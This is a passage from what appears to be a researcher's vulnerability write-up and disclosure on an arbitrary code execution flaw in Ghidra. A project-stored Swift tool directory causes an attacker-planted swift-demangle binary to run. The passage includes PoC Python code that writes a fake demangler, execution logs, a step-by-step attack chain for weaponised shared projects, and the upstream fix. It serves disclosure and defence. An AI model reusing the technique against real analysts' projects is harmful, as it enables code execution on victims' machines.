        help="Allow the benign platform calculator to be spawned as the "
        "'arbitrary process executed' marker. Implies intent to --execute.",
    )
    parser.add_argument(
        "--harmless-zip",
        action="store_true",
        help="Emit a benign ZIP sample during the sevenzip mode.",
    )
    parser.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        help="Enable debug-level logging.",
    )
    parser.add_argument(
        "--version",
        action="version",
        version=f"%(prog)s {TOOL_VERSION} (by {AUTHOR})",
    )
    return parser


def build_config(args: argparse.Namespace) -> ResearchConfig:
    """Translate parsed CLI args into a validated ``ResearchConfig``."""
    modes = ResearchConfig.ALL_MODES if args.mode == "all" else (args.mode,)
    # --launch-calc is meaningless without --execute; treat it as implying it so
    # the operator's intent ("I want to see calc") is honoured without a footgun.
    execute = args.execute or args.launch_calc
    return ResearchConfig(
        modes=modes,
        ghidra_source=ResearchConfig.resolve_source(args.ghidra_source),
        artifacts_dir=args.artifacts_dir.resolve(),
        execute=execute,
        launch_calc=args.launch_calc,
        create_harmless_zip=args.harmless_zip,
        verbose=args.verbose,
    )


def main(argv: Optional[Sequence[str]] = None) -> int:
    """CLI entrypoint. Returns a process exit code."""
    args = build_parser().parse_args(argv)
    configure_logging(args.verbose)
    LOG.info("Ghidra 12.1.2 research framework v%s (%s)", TOOL_VERSION, AUTHOR)
    config = build_config(args)
    try:
        return ResearchRunner(config).run()
    except KeyboardInterrupt:  # graceful Ctrl-C
        LOG.warning("interrupted by user")
        return 130


if __name__ == "__main__":
    raise SystemExit(main())
```

</details>

Rather than write a one-shot script, I built a modular research framework that cleanly demonstrates the sink without needing a full Ghidra installation. Let me walk through exactly how it works against the vulnerability.

**Running it:**

```
┌──(sn0x㉿sn0x)-[~/0dev/Ghidra/research]
└─$ python3 ghostmangle.py --mode swift
```

```
10:14:22 | INFO    | Ghidra 12.1.2 research framework v2.0.0 (sn0x-sharma)
10:14:22 | INFO    | == validating environment ==
10:14:22 | INFO    | == running research components ==
10:14:22 | INFO    | running component: swift-ace
10:14:22 | INFO    | swift-ace: dry run (pass --execute to launch the fake tool)
10:14:22 | INFO    | == collecting evidence ==
10:14:22 | INFO    | == generating summary ==
10:14:22 | INFO    | [PASS   ] swift-ace: Fake Swift demangler staged; not executed (dry run).
```

This is dry run it creates the fake tool directory but launches nothing. Let me show you what the framework actually builds.

#### How the Fake Demangler Gets Written

The critical function is `_write_fake_demangler()` in the `SwiftAnalyzer` class (lines 530–549 of `ghostmangle.py`):

```python
def _write_fake_demangler(self, fake_tool: Path, marker: Path) -> None:
    lines = [self.profile.script_header]   # line 537: #!/bin/sh on Linux
    if self.profile.is_windows:
        lines.append("echo Swift demangler calc PoC (sn0x-sharma)\n")
        lines.append(f'echo ran with: %* > "{marker}"\n')
        if self.config.launch_calc:
            lines.append("start \"\" calc.exe\n")
    else:
        lines.append("echo 'Swift demangler calc PoC (sn0x-sharma)'\n")
        lines.append(f'printf "ran with: %s\\n" "$*" > "{marker}"\n')  # ← captures args Ghidra passed
        if self.config.launch_calc:
            lines.append(f"({self.profile.calc_shell_command()}) &\n")  # ← spawns calc
    fake_tool.write_text("".join(lines), encoding="utf-8")
    self.profile.mark_executable(fake_tool)   # line 549: chmod +x
```

**Against the vulnerability:**

* The script is placed exactly at the path Ghidra would look for: `<swiftToolDir>/swift-demangle`
* It's made executable (line 549) just like a real binary
* When Ghidra calls `swift-demangle --version` (SINK 1), our fake binary runs instead
* The `$*` capture records what args Ghidra passed proving it was called with `--version` exactly as `SwiftNativeDemangler.java` would call it
* The marker file drops to disk proving execution happened

This directly mirrors the real-world attack:

<figure><img src="../../.gitbook/assets/image (288).png" alt=""><figcaption></figcaption></figure>

#### Platform Detection - Why It Matters

Lines 95–176 handle platform differences. The `PlatformProfile` class resolves everything once at startup:

```python
@property
def demangler_filename(self) -> str:
    return "swift-demangle.cmd" if self.is_windows else "swift-demangle"  # line 137
```

On Windows, Ghidra would look for `swift-demangle.cmd` — so our fake tool needs that name exactly. On Linux/macOS, it's just `swift-demangle`. The PoC gets both right, making it a faithful reproduction on any platform.

#### Now with execution the full PoC:

```
┌──(sn0x㉿sn0x)-[~/0dev/Ghidra/research]
└─$ python3 ghostmangle.py --mode swift --execute --launch-calc
```

```
10:15:09 | INFO    | Ghidra 12.1.2 research framework v2.0.0 (sn0x-sharma)
10:15:09 | INFO    | == validating environment ==
10:15:09 | INFO    | == running research components ==
10:15:09 | INFO    | running component: swift-ace
10:15:09 | INFO    | swift-ace: launching fake demangler as Ghidra would
Swift demangler calc PoC (sn0x-sharma)
10:15:09 | INFO    | [PASS   ] swift-ace: Swift demangler sink reproduced; attacker binary executed.
10:15:09 | INFO    |     - Fake Swift tool directory: artifacts/swift-demangler-calc/fake-swift-bin
10:15:09 | INFO    |     - Fake demangler: artifacts/swift-demangler-calc/fake-swift-bin/swift-demangle
10:15:09 | INFO    |     - Simulated Ghidra launch: swift-demangle --version
10:15:09 | INFO    |     - Execution marker: artifacts/swift-demangler-calc/swift_demangler_calc_marker.txt

Artifacts written:
    - artifacts/swift-demangler-calc/fake-swift-bin/swift-demangle
    - artifacts/swift-demangler-calc/swift_demangler_calc_marker.txt
```

Calculator pops. Marker file proves execution:

```
┌──(sn0x㉿sn0x)-[~/0dev/Ghidra/research]
└─$ cat artifacts/swift-demangler-calc/swift_demangler_calc_marker.txt
ran with: --version
```

That `--version` is the argument `SwiftNativeDemangler.java` passes at its first launch SINK 1 the validation call. Proof that our fake binary executed in exactly the position Ghidra would execute the real attacker binary.

***

### The Orchestration How the Framework Runs

The `ResearchRunner` class (lines 852–928) ties everything together:

```python
def run(self) -> int:
    stage("checking prerequisites")
    components = self._build_components()              # line 884: builds SwiftAnalyzer etc.
    env = EnvironmentValidator(...).validate(components)  # line 887: preflight checks
    if not env.ok:
        return 3                                       # line 890: fail fast

    stage("running research components")
    results = []
    for component in components:
        if component.requires_source and self.scanner is None:
            results.append(ComponentResult(...SKIPPED))  # line 903: skip if no source tree
            continue
        results.append(component.run())                # line 907: run it

    ReportGenerator(self.evidence).generate(results)   # line 919: write summary
    return self._exit_code(results)                    # line 921: 0 or 2
```

`SwiftAnalyzer` has `requires_source = False` (line 466) meaning it needs no Ghidra source tree to run. This is intentional: the ACE sink is fully reproducible by just creating the fake tool directory. The PoC is self-contained.

Compare this to `TraceManager` and `SevenZipProbe` which have `requires_source = True` they need the actual Ghidra source to scan for their sinks.

***

### The Disclosure Timeline

```
June 6 2026 Filed GHSA-pcfh-853f-q3gh privately via GitHub Security Advisory
Week 2  Maintainer "This is working as intended. We do not consider it a security issue."
Week 3  I explain the silent project-import reproduction path in detail
Week 4  Maintainer : "Thank you, I am seeing what you are describing now."
Week 4  Fix committed: c03a70d
Week 5  Report accepted
Week 7  CVE Assigned 
```

The pushback moment was expected. "Working as intended" is the standard first response to any finding that requires a precondition. The key is having a concrete reproduction path that makes the attacker-controlled scenario undeniable which the project-import chain does.

***

### The Fix

NSA  fix in `c03a70d` restricts the Swift analyzer to only call `swift-demangle` from the system `PATH`, eliminating the configurable tool directory entirely:

<figure><img src="../../.gitbook/assets/image (290).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (292).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://github.com/NationalSecurityAgency/ghidra/commit/c03a70d" %}

This breaks the attack chain at the source: even if a malicious project carries a `swiftToolDir` option, it no longer has any effect on which binary gets executed.

***

### Attack Chain

```
┌─────────────────────────────────────────────────────────────────────────┐
│  ATTACKER                                                               │
│  1. Creates attacker-controlled directory: /tmp/evil-swift/             │
│  2. Drops malicious binary at: /tmp/evil-swift/swift-demangle           │
│  3. Opens Ghidra, sets Swift Tool Dir option to /tmp/evil-swift/        │
│  4. Saves project → swiftToolDir persisted in project .gpr state        │
│  5. Shares project file with victim                                     │
└────────────────────────────┬────────────────────────────────────────────┘
                             │
                    (project file transferred)
                             │
                             ▼
┌─────────────────────────────────────────────────────────────────────────┐
│  VICTIM                                                                 │
│  6. Opens shared project (File → Open Project)                          │
│  7. Loads any binary → triggers analysis                                │
│  8. SwiftDemanglerAnalyzer fires → reads swiftToolDir from project state│
│  9. SwiftNativeDemangler builds path: /tmp/evil-swift/swift-demangle    │
│ 10. Ghidra executes binary with --version → ATTACKER CODE RUNS          │
│ 11. Ghidra executes binary again during demangling → ATTACKER CODE RUNS │
│                                                                         │
│  Result: ACE in Ghidra user context                                     │
│          In headless/CI: full host compromise under process user         │
└─────────────────────────────────────────────────────────────────────────┘
```

***

### Closing Thoughts

The thing that makes this finding interesting isn't that Ghidra executes a binary lots of tools do that. It's the trust-boundary gap: the configured binary path lives inside the project state, and Ghidra treats restored project state as implicitly trusted. There's no prompt, no trust marker, no user confirmation when project-supplied analyzer options get applied.

For most tools, "open a file from the internet" is the risk model. For Ghidra, "open a project from a teammate" is also the risk model and that's a workflow RE analysts do constantly.

The fix is clean: just use PATH and nothing else. One commit, problem gone.

***
